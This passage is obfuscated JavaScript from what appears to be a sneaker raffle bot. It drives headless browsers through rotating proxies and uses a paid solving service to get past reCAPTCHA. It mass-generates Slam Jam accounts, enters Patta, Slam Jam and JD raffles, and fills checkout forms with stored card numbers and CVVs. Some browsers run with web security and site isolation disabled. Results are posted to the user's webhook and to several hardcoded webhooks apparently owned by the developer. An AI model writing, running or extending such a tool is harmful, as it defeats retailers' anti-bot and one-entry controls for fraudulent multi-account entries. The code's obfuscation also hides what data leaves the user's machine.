            }), await _0x3e367a['waitForSelector']('#CustomerEmail'), console['log'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3e367a['type']('#CustomerEmail', '' + _0x2fab9f[_0x4ccd4b]['Email']), await _0x238216(0x12c), await _0x3e367a['type']('#CustomerPassword', '' + _0x2fab9f[_0x4ccd4b]['Password']), await _0x238216(0x226), await _0x3e367a['$eval']('#customer_login', _0x6886cb => _0x6886cb['submit']());
            try {
                await _0x3e367a['waitForSelector']('#orders'), await _0x238216(0x4b0);
            } catch {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x3e367a['goto']('' + _0x2fab9f[_0x4ccd4b]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x238216(0xbb8), console['log'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x3e367a['waitForSelector']('#email');
            } catch {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
            }
            await _0x3e367a['type']('#email', '' + _0x2fab9f[_0x4ccd4b]['Email']), await _0x238216(0x384), await _0x3e367a['type']('#first_name', '' + _0x2fab9f[_0x4ccd4b]['FirstName']), await _0x238216(0x514), await _0x3e367a['type']('#last_name', '' + _0x2fab9f[_0x4ccd4b]['LastName']), await _0x238216(0x514), await _0x3e367a['type']('#street_address', _0x2fab9f[_0x4ccd4b]['Address1'] + '\x20' + _0x2fab9f[_0x4ccd4b]['HouseNumber'] + '\x20' + _0x2fab9f[_0x4ccd4b]['Address2']), await _0x238216(0x2bc);
            _0x2fab9f[_0x4ccd4b]['Postcode'] == undefined && (_0x2fab9f[_0x4ccd4b]['Postcode'] = _0x2fab9f[_0x4ccd4b]['Zip']);
            await _0x3e367a['type']('#zip_code', '' + _0x2fab9f[_0x4ccd4b]['Postcode']), await _0x238216(0x320), await _0x3e367a['type']('#city', '' + _0x2fab9f[_0x4ccd4b]['City']), await _0x238216(0x320), await _0x3e367a['type']('#bday', '01/01/1994'), await _0x238216(0x320), await _0x3e367a['type']('#instagram', '' + _0x2fab9f[_0x4ccd4b]['Follower']), await _0x238216(0x352);
            if (_0x2fab9f[_0x4ccd4b]['Size'] == 'RANDOM') {
                const _0x576dd1 = await _0x3e367a['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x42d722 => {
                    return _0x42d722['map'](_0x36b75c => _0x36b75c['textContent']);
                });
                var _0x120250 = Math['round'](Math['random']() * (_0x576dd1['length'] - 0x1));
                console['log'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x576dd1[_0x120250]), await _0x3e367a['click']('label[data-eu-size=\x22' + _0x576dd1[_0x120250] + '\x22]');
            } else {
                console['log'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x2fab9f[_0x4ccd4b]['Size']);
                try {
                    await _0x3e367a['click']('label[data-eu-size=\x22' + _0x2fab9f[_0x4ccd4b]['Size'] + '\x22]');
                } catch {
                    await _0x3e367a['click']('label[data-eu-size=\x22' + _0x2fab9f[_0x4ccd4b]['Size'] + '.0\x22]');
                }
            }
            await _0x238216(0xbb8), await _0x3e367a['$$eval']('.raffle__checkbox-label', _0x1f4603 => _0x1f4603['forEach'](_0x1c2f31 => _0x1c2f31['click']())), await _0x238216(0x7d0), console['log'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3e367a['click']('#raffle__form-submit'), await _0x238216(0x1388);
            try {
                await _0x3e367a['waitForSelector']('#raffle__confirmation-message-container'), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            } catch (_0x568a78) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x568a78));
            }
        } catch (_0x428235) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20' + _0x428235)), _0x2a68a1 = 'yes';
        } finally {
            _0x4615b0 && _0x4615b0['close']();
            if (_0x2a68a1 == 'yes' && _0x2cbb58 != 0x5) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Retrying')), _0x4ccd4b = _0x4ccd4b - 0x1, _0x2cbb58 = _0x2cbb58 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x4eb501(_0x38a298, _0x26987d, _0x465ac2, _0x35e096) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x535834 = 0x0; _0x535834 < _0x465ac2['length']; _0x535834++) {
        var _0x4ead04 = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }];
        const _0x5c7a13 = { 'embeds': _0x4ead04 };
        _0x52fa74(_0x26987d['name'] + '\x20Task\x20' + (_0x535834 + 0x1) + '\x20/\x20' + _0x465ac2['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x465ac2, _0x535834);
        var _0x13869b = await _0x5e2a41(_0x465ac2[_0x535834], _0x26987d, 'acc', ![]);
        const _0x1f952b = { 'succesDEVMSG': { 'embeds': [_0x13869b] } };
        if (_0x465ac2[_0x535834]['Email'] == '' || _0x465ac2[_0x535834]['FirstName'] == '' || _0x465ac2[_0x535834]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x238216(0x7d0);
            continue;
        }
        (_0x465ac2[_0x535834]['Password'] == '' || _0x465ac2[_0x535834] == undefined) && _0x465ac2[_0x535834]['Password'] == 'JRaffles23!';
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x240991 = _0x35e096[_0x535834]['split'](':');
        else
            var _0xa2e3c2 = Math['round'](Math['random']() * (_0x35e096['length'] - 0x1)), _0x240991 = _0x35e096[_0xa2e3c2]['split'](':');
        const _0x49156f = await _0x15c804['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x240991[0x0] + ':' + _0x240991[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xbf883e = await _0x49156f['newPage']();
            await _0xbf883e['authenticate']({
                'username': '' + _0x240991[0x2],
                'password': '' + _0x240991[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xbf883e['setRequestInterception'](!![]), _0xbf883e['on']('request', _0x19facc => {
                _0x19facc['resourceType']() === 'image' || _0x19facc['resourceType']() === 'font' || _0x19facc['resourceType']() === 'media' ? _0x19facc['abort']() : _0x19facc['continue']();
            }), await _0xbf883e['goto']('https://drop.slamjam.com/account/register'), await _0x238216(0xbb8), await _0xbf883e['waitForSelector']('#FirstName'), await _0xbf883e['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xbf883e['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Filling\x20information'), await _0x238216(0x4b0), await _0xbf883e['type']('#FirstName', '' + _0x465ac2[_0x535834]['FirstName']), await _0x238216(0x226), await _0xbf883e['type']('#LastName', '' + _0x465ac2[_0x535834]['LastName']), await _0x238216(0x226), await _0xbf883e['type']('#Email', '' + _0x465ac2[_0x535834]['Email']), await _0x238216(0x2ee), await _0xbf883e['type']('#ConfirmEmail', '' + _0x465ac2[_0x535834]['Email']), await _0x238216(0x2ee), await _0xbf883e['type']('#CreatePassword', '' + _0x465ac2[_0x535834]['Password']), await _0x238216(0x2ee), await _0xbf883e['type']('#CreateConfirmPassword', '' + _0x465ac2[_0x535834]['Password']), await _0x238216(0x226), console['log'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Submitting..'), await _0xbf883e['$eval']('#create_customer', _0x1fb400 => _0x1fb400['submit']()), await _0x238216(0x1388), console['log'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20' + _0xc5437b['cyan']('Solving\x20Captcha')), await _0xbf883e['solveRecaptchas'](), console['log'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xbf883e['$eval']('.shopify-challenge__container\x20>\x20form', _0x436ed2 => _0x436ed2['submit']());
            try {
                await _0xbf883e['waitForSelector']('.product-card__image'), await _0x238216(0x1f4), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Account\x20' + _0x465ac2[_0x535834]['Email'] + '\x20Generated!')), _0x582c0f['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x465ac2[_0x535834]['Email'] + ',' + _0x465ac2[_0x535834]['Password']), console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x26987d['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Account\x20' + _0x465ac2[_0x535834]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                try {
                    _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x1f952b['succesDEVMSG']);
                } catch {
                }
                await _0x4f7227(_0xd1db44, _0x1f952b['succesDEVMSG']);
            } catch (_0x1896df) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1896df));
            }
        } catch (_0x4c1d67) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x535834 + 0x1) + '\x20:\x20' + _0x4c1d67));
        } finally {
            _0x49156f && _0x49156f['close'](), console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x25e6b0(_0x3bde46, _0x2b9803, _0x41fb90, _0x3a20b9) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x5a49cd = 0x0; _0x5a49cd < _0x41fb90['length']; _0x5a49cd++) {
        var _0x23a1ea = '', _0x1f072b = 0x0;
        _0x52fa74(_0x2b9803['name'] + '\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20/\x20' + _0x41fb90['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x41fb90, _0x5a49cd);
        if (_0x41fb90[_0x5a49cd]['Email'] == '' || _0x41fb90[_0x5a49cd]['Password'] == '' || _0x41fb90[_0x5a49cd]['FirstName'] == '' || _0x41fb90[_0x5a49cd]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x33f1ea = _0x3a20b9[_0x5a49cd]['split'](':');
        else
            var _0x255011 = Math['round'](Math['random']() * (_0x3a20b9['length'] - 0x1)), _0x33f1ea = _0x3a20b9[_0x255011]['split'](':');
        const _0x6fca76 = await _0x15c804['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x33f1ea[0x0] + ':' + _0x33f1ea[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials'
            ]
        });
        try {
            const _0x168567 = await _0x6fca76['newPage']();
            await _0x168567['authenticate']({
                'username': '' + _0x33f1ea[0x2],
                'password': '' + _0x33f1ea[0x3]
            }), await _0x168567['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x168567['setRequestInterception'](!![]), _0x168567['on']('request', _0x1c307d => {
                _0x1c307d['resourceType']() === 'image' || _0x1c307d['resourceType']() === 'font' || _0x1c307d['resourceType']() === 'media' ? _0x1c307d['abort']() : _0x1c307d['continue']();
            }), await _0x168567['goto']('https://drop.slamjam.com/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x168567['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x168567['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x238216(0x258), await _0x168567['waitForSelector']('#CustomerEmail'), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Logging\x20in..'), await _0x168567['type']('#CustomerEmail', '' + _0x41fb90[_0x5a49cd]['Email']), await _0x238216(0x12c), await _0x168567['type']('#CustomerPassword', '' + _0x41fb90[_0x5a49cd]['Password']), await _0x238216(0x226), await _0x168567['$eval']('#customer_login', _0x26c36d => _0x26c36d['submit']()), await _0x238216(0x7d0), await _0x168567['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20' + _0xc5437b['cyan']('Solving\x20Captcha')), await _0x168567['solveRecaptchas'](), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x168567['$eval']('.shopify-challenge__container\x20>\x20form', _0x2281a9 => _0x2281a9['submit']());
            try {
                await _0x168567['waitForSelector']('.nav-account'), await _0x238216(0x4b0);
            } catch {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                continue;
            }
            await _0x168567['goto']('' + _0x41fb90[_0x5a49cd]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            }), await _0x238216(0xbb8), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Starting\x20Entry');
            try {
                await _0x168567['waitForSelector']('#ProductSelect-product-template-raffle');
            } catch {
            }
            await _0x168567['click']('.product-select-variant-wrapper'), await _0x238216(0x320), await _0x168567['click']('li.product-select-variant__value[data-size=\x22' + _0x41fb90[_0x5a49cd]['Size'] + '\x22]'), await _0x238216(0x384), await _0x168567['$eval']('#AddToCartForm-product-template-raffle', _0x4720af => _0x4720af['submit']()), await _0x168567['waitForSelector']('.cart-order-summary__content'), await _0x238216(0x514), await _0x168567['goto']('https://drop.slamjam.com/checkout'), await _0x238216(0x514), await _0x168567['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Filling\x20Information'), await _0x168567['select']('#checkout_shipping_address_country', '' + _0x41fb90[_0x5a49cd]['Country']), await _0x238216(0x200), await _0x168567['waitForSelector']('#checkout_shipping_address_first_name'), await _0x168567['type']('#checkout_shipping_address_first_name', '' + _0x41fb90[_0x5a49cd]['FirstName']), await _0x238216(0x237), await _0x168567['type']('#checkout_shipping_address_last_name', '' + _0x41fb90[_0x5a49cd]['LastName']), await _0x238216(0x1e0), await _0x168567['type']('#checkout_shipping_address_address1', _0x41fb90[_0x5a49cd]['Address1'] + '\x20' + _0x41fb90[_0x5a49cd]['HouseNumber']), await _0x238216(0x514), await _0x168567['type']('#checkout_shipping_address_address2', '' + _0x41fb90[_0x5a49cd]['Address2']), await _0x238216(0x514);
            _0x41fb90[_0x5a49cd]['Postcode'] == undefined && (_0x41fb90[_0x5a49cd]['Postcode'] = _0x41fb90[_0x5a49cd]['Zip']);
            await _0x168567['type']('#checkout_shipping_address_zip', '' + _0x41fb90[_0x5a49cd]['Postcode']), await _0x238216(0x2bc), await _0x168567['type']('#checkout_shipping_address_city', '' + _0x41fb90[_0x5a49cd]['City']), await _0x238216(0x320), await _0x168567['type']('#checkout_shipping_address_phone', '' + _0x41fb90[_0x5a49cd]['Phone']), await _0x238216(0x320), await _0x168567['click']('#continue_button'), await _0x238216(0xbb8), await _0x168567['waitForSelector']('.summary-title'), await _0x238216(0x320), await _0x168567['click']('#continue_button'), await _0x238216(0x320), console['log'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Fetching\x20Payment'), await _0x168567['waitForSelector']('#checkout_credit_card_vault'), await _0x238216(0x3e8);
            var _0x115e95 = await _0x168567['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0xc666dc = await _0x115e95['contentFrame']();
            await _0xc666dc['click']('#number'), await _0x238216(0x3e8), await _0x168567['type']('#checkout_credit_card_vault', '' + _0x41fb90[_0x5a49cd]['CardNumber'], { 'delay': 0x78 }), _0x115e95 = await _0x168567['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0xc666dc = await _0x115e95['contentFrame'](), await _0x238216(0x1c2), await _0xc666dc['click']('#name'), await _0x238216(0x1f4), await _0x168567['type']('div[data-card-field-placeholder=\x22Name\x20on\x20card\x22]', '' + _0x41fb90[_0x5a49cd]['NameOnCard'], { 'delay': 0x78 }), _0x115e95 = await _0x168567['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0xc666dc = await _0x115e95['contentFrame'](), await _0x238216(0x1c2), await _0xc666dc['click']('#expiry'), await _0x238216(0x1f4), await _0x168567['type']('div[data-card-field-placeholder=\x22Expiration\x20date\x20(MM\x20/\x20YY)\x22]', '' + _0x41fb90[_0x5a49cd]['ExpiryDate'], { 'delay': 0x78 }), _0x115e95 = await _0x168567['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0xc666dc = await _0x115e95['contentFrame'](), await _0x238216(0x1c2), await _0xc666dc['click']('#verification_value'), await _0x238216(0x1f4), await _0x168567['type']('div[data-card-field-placeholder=\x22Security\x20code\x22]', '' + _0x41fb90[_0x5a49cd]['CVV'], { 'delay': 0x78 }), console['log']('before\x20eval'), await _0x168567['$eval']('#accepts-flag-raffle', _0x4b3aff => _0x4b3aff['click']()), await _0x168567['evaluate'](() => {
                document['querySelector']('#accepts-flag-raffle')['parentElement']['click']();
            }), console['log']('before\x20page.click'), await _0x168567['click']('#accepts-flag-raffle'), await _0x168567['click']('#accepts-flag-raffle'), await _0x238216(0x7d0), console['log']('before\x20before\x20form'), await _0x168567['$eval']('.edit_checkout.animate-floating-labels', _0x47da51 => _0x47da51['submit']()), await _0x238216(0x7d0), await _0x168567['waitForSelector']('div[data-step=\x22review\x22]'), await _0x238216(0x5dc), await _0x168567['$eval']('.edit_checkout.animate-floating-labels', _0x4a2fa5 => _0x4a2fa5['submit']()), await _0x238216(0xf4240);
            var _0xb8ddf1 = await _0x5e2a41(_0x41fb90[_0x5a49cd], _0x2b9803, 'dev', ![]), _0x42da8c = await _0x5e2a41(_0x41fb90[_0x5a49cd], _0x2b9803, 'pub', ![]);
            const _0x319aa1 = {
                'succesDEVMSG': { 'embeds': [_0xb8ddf1] },
                'succesPUBMSG': { 'embeds': [_0x42da8c] }
            };
            try {
                _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x319aa1['succesDEVMSG']), await _0x238216(0xc8), await _0x4f7227(_0x57a1da, _0x319aa1['succesDEVMSG']), await _0x238216(0xc8), await _0x4f7227(_0xfe9ed6, _0x319aa1['succesPUBMSG']);
            } catch (_0x508b45) {
                console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x508b45));
            }
        } catch (_0x23a16c) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20' + _0x23a16c)), _0x23a1ea = 'yes';
        } finally {
            _0x6fca76 && _0x6fca76['close']();
            if (_0x23a1ea == 'yes' && _0x1f072b != 0x5) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x2b9803['name'] + ']\x20Task\x20' + (_0x5a49cd + 0x1) + '\x20:\x20Retrying')), _0x5a49cd = _0x5a49cd - 0x1, _0x1f072b = _0x1f072b + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x1a08d7(_0x5207a1, _0x5e42d1, _0x1ad0d8) {
    var _0x35e0f2 = ![], _0x2a64fe = ![];
    if (_0x5eb805['captchaKey'] == '' || _0x5eb805['captchaKey'] == undefined)
        return console['log'](_0xc5437b['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1267a8 = 0x0; _0x1267a8 < _0x5e42d1['length']; _0x1267a8++) {
        var _0x342b2a, _0x3b35d1 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x5e42d1[_0x1267a8]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x5e42d1[_0x1267a8]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }];
        const _0x17b420 = { 'embeds': _0x3b35d1 };
        _0x52fa74(_0x5207a1['name'] + '\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20/\x20' + _0x5e42d1['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x5e42d1, _0x1267a8);
        var _0x50af60 = await _0x5e2a41(_0x5e42d1[_0x1267a8], _0x5207a1, 'dev', ![]), _0x35a9a6 = await _0x5e2a41(_0x5e42d1[_0x1267a8], _0x5207a1, 'pub', ![]);
        const _0x423549 = {
            'succesDEVMSG': { 'embeds': [_0x50af60] },
            'succesPUBMSG': { 'embeds': [_0x35a9a6] }
        };
        if (_0x5e42d1[_0x1267a8]['Email'] == '' || _0x5e42d1[_0x1267a8]['Url'] == '' || _0x5e42d1[_0x1267a8]['FirstName'] == '' || _0x5e42d1[_0x1267a8]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x564cc1 = _0x1ad0d8[_0x1267a8]['split'](':');
        else
            var _0x22d716 = Math['round'](Math['random']() * (_0x1ad0d8['length'] - 0x1)), _0x564cc1 = _0x1ad0d8[_0x22d716]['split'](':');
        const _0xcf4285 = await _0x15c804['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x564cc1[0x0] + ':' + _0x564cc1[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x377189 = await _0xcf4285['newPage']();
            await _0x377189['authenticate']({
                'username': '' + _0x564cc1[0x2],
                'password': '' + _0x564cc1[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x377189['setRequestInterception'](!![]), _0x377189['on']('request', _0x531f7c => {
                _0x531f7c['resourceType']() === 'image' || _0x531f7c['resourceType']() === 'font' || _0x531f7c['resourceType']() === 'media' ? _0x531f7c['abort']() : _0x531f7c['continue']();
            }), await _0x377189['goto']('' + _0x5e42d1[_0x1267a8]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x377189['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x377189['type']('#comp_firstname', '' + _0x5e42d1[_0x1267a8]['FirstName']), await _0x377189['waitForSelector']('#comp_lastname'), await _0x377189['type']('#comp_lastname', '' + _0x5e42d1[_0x1267a8]['LastName']), await _0x377189['waitForSelector']('#comp_email'), await _0x377189['type']('#comp_email', '' + _0x5e42d1[_0x1267a8]['Email']), await _0x377189['waitForSelector']('#comp_paypalemail'), await _0x377189['type']('#comp_paypalemail', '' + _0x5e42d1[_0x1267a8]['Email']), await _0x377189['waitForSelector']('#comp_mobile_end'), await _0x377189['type']('#comp_mobile_end', '' + _0x5e42d1[_0x1267a8]['Phone']), await _0x377189['waitForSelector']('#comp_dob'), await _0x377189['type']('#comp_dob', '08/09/1992'), console['log'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x5e42d1[_0x1267a8]['Size'] == 'RANDOM') {
                const _0x8d64d3 = await _0x377189['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x43b2d9 => {
                    return _0x43b2d9['map'](_0x276c7c => _0x276c7c['value']);
                });
                var _0x2a8b63 = Math['round'](Math['random']() * (_0x8d64d3['length'] - 0x2));
                await _0x377189['select']('#shoesize', _0x8d64d3[_0x2a8b63 + 0x1]), await _0x238216(0x3e8);
            } else {
                const _0x125a15 = await _0x377189['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x136996 => {
                    return _0x136996['map'](_0x1fdac0 => _0x1fdac0['innerText']);
                }), _0xfb9d = await _0x377189['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x12137f => {
                    return _0x12137f['map'](_0x2a4074 => _0x2a4074['value']);
                });
                var _0x14529b = _0x5e42d1[_0x1267a8]['Size'];
                for (var _0x78dee4 = 0x1; _0x78dee4 < _0xfb9d['length']; _0x78dee4++) {
                    var _0x34313e = _0x125a15[_0x78dee4]['split']('\x20')[0x0];
                    if (_0x34313e == _0x14529b) {
                        await _0x377189['select']('#shoesize', _0xfb9d[_0x78dee4]);
                        break;
                    } else {
                        if (_0x78dee4 + 0x1 == _0xfb9d['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
